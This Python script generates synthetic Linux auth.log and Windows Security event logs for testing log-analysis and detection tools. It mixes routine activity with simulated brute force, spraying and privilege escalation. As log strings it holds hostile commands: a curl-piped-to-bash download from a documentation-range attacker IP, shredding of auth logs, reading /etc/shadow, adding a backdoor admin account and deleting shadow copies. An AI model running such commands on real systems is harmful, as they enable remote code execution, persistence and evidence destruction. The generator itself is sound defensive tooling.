#!/usr/bin/env python3
"""
Generate realistic synthetic log files for demos, testing and benchmarking.

Produces a Linux ``auth.log`` and a Windows Security log (XML export format)
that contain normal business-hours activity plus a set of embedded attack
scenarios: SSH/RDP brute force followed by a successful login, password
spraying, off-hours privilege escalation, backdoor account creation,
privileged group changes and anti-forensics.

All addresses come from documentation ranges (RFC 5737) and all accounts are
fictitious.

Usage:
    python tools/generate_samples.py                      # small samples in ./samples
    python tools/generate_samples.py --scale 2000 --prefix large_   # ~1M-line benchmark
"""

from __future__ import annotations

import argparse
import random
from datetime import date, datetime, timedelta, timezone
from pathlib import Path
from xml.sax.saxutils import escape

STAFF = ["alice", "bob", "carol", "dave"]
SPRAY_USERS = ["admin", "test", "oracle", "postgres", "ubuntu", "guest", "user", "ftp", "git", "jenkins", "pi", "support"]
NOISE_COMMANDS = ["/usr/bin/apt update", "/usr/bin/systemctl restart nginx", "/usr/bin/journalctl -u nginx",
                  "/usr/bin/docker ps", "/usr/bin/tail -n 100 /var/log/nginx/error.log"]
LINUX_HOST = "web01"
WIN_HOST = "WS01.corp.local"


def last_monday(today: date) -> date:
    """Return the Monday of the previous week so all sample days are in the past."""
    return today - timedelta(days=today.weekday() + 7)


# --------------------------------------------------------------------------- #
# Linux
# --------------------------------------------------------------------------- #
class LinuxLog:
    def __init__(self, rng: random.Random) -> None:
        self.rng = rng
        self.lines: list[tuple[datetime, str]] = []

    def add(self, moment: datetime, program: str, message: str, pid: int | None = None) -> None:
        pid = pid if pid is not None else self.rng.randint(1000, 65000)
        header = f"{moment:%b} {moment.day:>2} {moment:%H:%M:%S} {LINUX_HOST} {program}[{pid}]:"
        if program == "sudo":
            header = f"{moment:%b} {moment.day:>2} {moment:%H:%M:%S} {LINUX_HOST} sudo:"
        self.lines.append((moment, f"{header} {message}"))

    def port(self) -> int:
        return self.rng.randint(32768, 60999)


def generate_linux(path: Path, start: date, scale: int, rng: random.Random) -> int:
    log = LinuxLog(rng)

    for offset in range(5):
        day = datetime.combine(start + timedelta(days=offset), datetime.min.time())
        # Background noise around the clock (cron, systemd) - not security relevant.
        for minute in range(0, 24 * 60, max(1, 10 // scale)):
            moment = day + timedelta(minutes=minute, seconds=rng.randint(0, 59))
            log.add(moment, "CRON", "pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)")
            log.add(moment + timedelta(seconds=1), "CRON", "pam_unix(cron:session): session closed for user root")
        # Business-hours activity by staff.
        for _ in range(12 * scale):
            moment = day + timedelta(hours=9, seconds=rng.randint(0, 8 * 3600))
            user = rng.choice(STAFF[:3])
            ip = f"10.0.0.{rng.randint(10, 40)}"
            log.add(moment, "sshd", f"Accepted publickey for {user} from {ip} port {log.port()} ssh2: ED25519 SHA256:x")
            log.add(moment + timedelta(seconds=1), "systemd-logind", f"New session {rng.randint(1, 9999)} of user {user}.")
            if rng.random() < 0.5:
                log.add(moment + timedelta(minutes=2), "sudo",
                        f"{user} : TTY=pts/{rng.randint(0, 5)} ; PWD=/home/{user} ; USER=root ; "
                        f"COMMAND={rng.choice(NOISE_COMMANDS)}")
            if rng.random() < 0.1:
                log.add(moment - timedelta(seconds=5), "sshd",
                        f"Failed password for {user} from {ip} port {log.port()} ssh2")
            log.add(moment + timedelta(minutes=30), "sshd", f"Received disconnect from {ip} port {log.port()}:11: disconnected by user")

    day1, day2, day3 = (datetime.combine(start + timedelta(days=n), datetime.min.time()) for n in (0, 1, 2))

    # Scenario 1: password spraying (business hours, many accounts, one attempt each).
    moment = day1 + timedelta(hours=14, minutes=2)
    for user in SPRAY_USERS:
        moment += timedelta(seconds=rng.randint(5, 14))
        log.add(moment, "sshd", f"Failed password for invalid user {user} from 198.51.100.23 port {log.port()} ssh2")

    # Scenario 2: off-hours SSH brute force, successful login, escalation and cleanup.
    attacker = "203.0.113.45"
    moment = day2 + timedelta(hours=2, minutes=13)
    for attempt in range(72):
        moment += timedelta(seconds=rng.randint(1, 4))
        user = rng.choice(["root", "root", "deploy", "admin"])
        prefix = "invalid user " if user == "admin" else ""
        log.add(moment, "sshd", f"Failed password for {prefix}{user} from {attacker} port {log.port()} ssh2")
        if attempt == 40:
            log.add(moment, "sshd", f"message repeated 6 times: [ Failed password for root from {attacker} port {log.port()} ssh2]")
    moment += timedelta(minutes=3)
    log.add(moment, "sshd", f"Accepted password for deploy from {attacker} port {log.port()} ssh2")
    log.add(moment + timedelta(minutes=1), "sudo", "deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash")
    log.add(moment + timedelta(minutes=2), "useradd", "new group: name=sysbackup, GID=0")
    log.add(moment + timedelta(minutes=2, seconds=5), "useradd",
            "new user: name=sysbackup, UID=0, GID=0, home=/root, shell=/bin/bash, from=/dev/pts/1")
    log.add(moment + timedelta(minutes=3), "usermod", "add 'deploy' to group 'sudo'")
    log.add(moment + timedelta(minutes=3), "usermod", "add 'deploy' to shadow group 'sudo'")
    log.add(moment + timedelta(minutes=4), "sudo",
            "deploy : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/curl -s http://203.0.113.45/x.sh | bash")
    log.add(moment + timedelta(minutes=6), "sudo",
            "deploy : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/shred -u /var/log/auth.log.1")

    # Scenario 3: unauthorized sudo attempt during business hours.
    log.add(day2 + timedelta(hours=10, minutes=31), "sudo",
            "carol : user NOT in sudoers ; TTY=pts/2 ; PWD=/home/carol ; USER=root ; COMMAND=/bin/cat /etc/shadow")
    log.add(day2 + timedelta(hours=10, minutes=33), "sudo",
            "carol : 3 incorrect password attempts ; TTY=pts/2 ; PWD=/home/carol ; USER=root ; COMMAND=/usr/bin/su -")

    # Scenario 4: late-night su to root.
    late = day3 + timedelta(hours=23, minutes=41)
    log.add(late - timedelta(minutes=1), "sshd", f"Accepted password for bob from 10.0.0.23 port {log.port()} ssh2")
    log.add(late, "su", "pam_unix(su:session): session opened for user root(uid=0) by bob(uid=1001)")

    # Scenario 5: direct root SSH login from an external address.
    log.add(day3 + timedelta(hours=11, minutes=5), "sshd", f"Accepted password for root from 192.0.2.10 port {log.port()} ssh2")

    log.lines.sort(key=lambda item: item[0])
    with open(path, "w", encoding="utf-8", newline="\n") as handle:
        for _, line in log.lines:
            handle.write(line + "\n")
    return len(log.lines)


# --------------------------------------------------------------------------- #
# Windows (XML export, as produced by Event Viewer "Save as XML")
# --------------------------------------------------------------------------- #
NS = "http://schemas.microsoft.com/win/2004/08/events/event"


class WindowsLog:
    def __init__(self) -> None:
        self.events: list[tuple[datetime, int, str, dict[str, str], str]] = []

    def add(self, local_time: datetime, event_id: int, data: dict[str, str],
            provider: str = "Microsoft-Windows-Security-Auditing") -> None:
        self.events.append((local_time, event_id, provider, data, ""))

    def write(self, path: Path) -> int:
        self.events.sort(key=lambda item: item[0])
        with open(path, "w", encoding="utf-8", newline="\n") as handle:
            handle.write('<?xml version="1.0" encoding="UTF-8"?>\n<Events>\n')
            for record_id, (local_time, event_id, provider, data, _) in enumerate(self.events, 1000):
                utc = local_time.astimezone(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f0Z")
                if event_id == 1102:
                    payload = (
                        '<UserData><LogFileCleared xmlns="http://manifests.microsoft.com/win/2004/08/windows/eventlog">'
                        + "".join(f"<{k}>{escape(v)}</{k}>" for k, v in data.items())
                        + "</LogFileCleared></UserData>"
                    )
                else:
                    payload = "<EventData>" + "".join(
                        f'<Data Name="{k}">{escape(v)}</Data>' for k, v in data.items()) + "</EventData>"
                handle.write(
                    f'<Event xmlns="{NS}"><System><Provider Name="{provider}"/>'
                    f"<EventID>{event_id}</EventID><TimeCreated SystemTime=\"{utc}\"/>"
                    f"<EventRecordID>{record_id}</EventRecordID><Channel>Security</Channel>"
                    f"<Computer>{WIN_HOST}</Computer></System>{payload}</Event>\n"
                )
            handle.write("</Events>\n")
        return len(self.events)


def logon(user: str, ip: str, logon_type: int, workstation: str = "WS01") -> dict[str, str]:
    return {"SubjectUserName": "WS01$", "TargetUserName": user, "TargetDomainName": "CORP",
            "LogonType": str(logon_type), "WorkstationName": workstation, "IpAddress": ip}


def generate_windows(path: Path, start: date, scale: int, rng: random.Random) -> int:
    log = WindowsLog()
    for offset in range(5):
        day = datetime.combine(start + timedelta(days=offset), datetime.min.time())
        for _ in range(10 * scale):
            moment = day + timedelta(hours=8, minutes=30, seconds=rng.randint(0, 8 * 3600))
            user = rng.choice(STAFF)
            log.add(moment, 4624, logon(user, f"10.0.1.{rng.randint(10, 60)}", rng.choice([2, 3, 3, 10])))
            log.add(moment + timedelta(seconds=30), 4688, {
                "SubjectUserName": user, "NewProcessName": r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE",
                "CommandLine": '"OUTLOOK.EXE"', "ParentProcessName": r"C:\Windows\explorer.exe"})
            # Service logons at night are routine and must not be flagged.
            log.add(day + timedelta(hours=rng.randint(0, 6), minutes=rng.randint(0, 59)), 4624,
                    logon("SYSTEM", "-", 5))

    day2 = datetime.combine(start + timedelta(days=1), datetime.min.time())
    attacker = "203.0.113.77"
    moment = day2 + timedelta(hours=1, minutes=5)
    for _ in range(35):
        moment += timedelta(seconds=rng.randint(2, 6))
        data = logon("Administrator", attacker, 3, "kali")
        data.update({"Status": "0xc000006d", "SubStatus": "0xc000006a", "FailureReason": "%%2313"})
        log.add(moment, 4625, data)
    moment += timedelta(minutes=2)
    log.add(moment, 4624, logon("Administrator", attacker, 10, "kali"))
    log.add(moment, 4672, {"SubjectUserName": "Administrator",
                           "PrivilegeList": "SeSecurityPrivilege\n\t\t\tSeDebugPrivilege\n\t\t\tSeBackupPrivilege"})
    log.add(moment + timedelta(minutes=3), 4688, {
        "SubjectUserName": "Administrator", "NewProcessName": r"C:\Windows\System32\net.exe",
        "CommandLine": "net user svc-update P@ssw0rd123 /add", "ParentProcessName": r"C:\Windows\System32\cmd.exe"})
    new_sid = "S-1-5-21-1004336348-1177238915-682003330-1104"
    log.add(moment + timedelta(minutes=3, seconds=2), 4720, {
        "SubjectUserName": "Administrator", "TargetUserName": "svc-update", "TargetSid": new_sid})
    log.add(moment + timedelta(minutes=4), 4732, {
        "SubjectUserName": "Administrator", "MemberName": "-", "MemberSid": new_sid,
        "TargetUserName": "Administrators", "TargetDomainName": "Builtin"})
    log.add(moment + timedelta(minutes=6), 4688, {
        "SubjectUserName": "Administrator", "NewProcessName": r"C:\Windows\System32\vssadmin.exe",
        "CommandLine": "vssadmin.exe delete shadows /all /quiet", "ParentProcessName": r"C:\Windows\System32\cmd.exe"})
    log.add(moment + timedelta(minutes=8), 1102, {"SubjectUserSid": "S-1-5-21-500", "SubjectUserName": "Administrator",
                                                  "SubjectDomainName": "WS01"}, provider="Microsoft-Windows-Eventlog")
    return log.write(path)


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--output-dir", type=Path, default=Path(__file__).resolve().parents[1] / "samples")
    parser.add_argument("--scale", type=int, default=1, help="background volume multiplier (default: 1)")
    parser.add_argument("--prefix", default="", help="file name prefix, e.g. 'large_'")
    parser.add_argument("--seed", type=int, default=1337)
    args = parser.parse_args()

    args.output_dir.mkdir(parents=True, exist_ok=True)
    rng = random.Random(args.seed)
    start = last_monday(date.today())
    linux_path = args.output_dir / f"{args.prefix}auth.log"
    windows_path = args.output_dir / f"{args.prefix}windows_security.xml"
    print(f"{linux_path}: {generate_linux(linux_path, start, args.scale, rng):,} lines")
    print(f"{windows_path}: {generate_windows(windows_path, start, args.scale, rng):,} events")


if __name__ == "__main__":
    main()
